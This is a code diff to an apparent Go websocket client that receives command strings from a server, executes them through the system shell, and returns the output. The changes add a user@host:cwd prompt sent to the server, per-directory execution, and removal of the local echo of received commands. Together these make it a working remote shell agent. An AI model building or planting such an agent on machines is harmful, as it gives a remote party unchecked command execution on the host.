@@ -42,7 +42,25 @@ func main() {
 	}
 	defer conn.Close()
 
+	// Get initial working directory and hostname for prompt
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME") // for Windows
+	}
+
 	for {
+		// Get current working directory for prompt
+		cwd, _ := os.Getwd()
+
+		// Send initial prompt to server
+		prompt := fmt.Sprintf("\n%s@%s:%s $ ", username, hostname, cwd)
+		err := conn.WriteMessage(websocket.TextMessage, []byte(prompt))
+		if err != nil {
+			log.Println("Error sending prompt:", err)
+			break
+		}
+
 		// Read command from server
 		_, message, err := conn.ReadMessage()
 		if err != nil {
@@ -51,16 +69,20 @@ func main() {
 		}
 
 		command := string(message)
-		fmt.Printf("Received command: %s\n", command)
+		if command == "" {
+			continue
+		}
 
 		// Prepare command execution based on shell type
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
 			cmd = exec.Command("cmd", "/c", command)
 		} else {
-			// Pass the entire command as a single argument to the shell
 			cmd = exec.Command("/bin/sh", "-c", command)
 		}
+
+		// Set the working directory for the command
+		cmd.Dir = cwd
 
 		// Execute with full pipe handling
 		output, err := executeCommand(cmd)
@@ -69,6 +91,9 @@ func main() {
 		}
 
 		// Send output back to server
+		if len(output) == 0 {
+			output = []byte("\n")
+		}
 		err = conn.WriteMessage(websocket.TextMessage, output)
 		if err != nil {
 			log.Println("Error sending output:", err)
@@ -108,5 +133,6 @@ func executeCommand(cmd *exec.Cmd) ([]byte, error) {
 		return append(stdoutBytes, stderrBytes...), err
 	}
 
+	// Combine stdout and stderr
 	return append(stdoutBytes, stderrBytes...), nil
 }
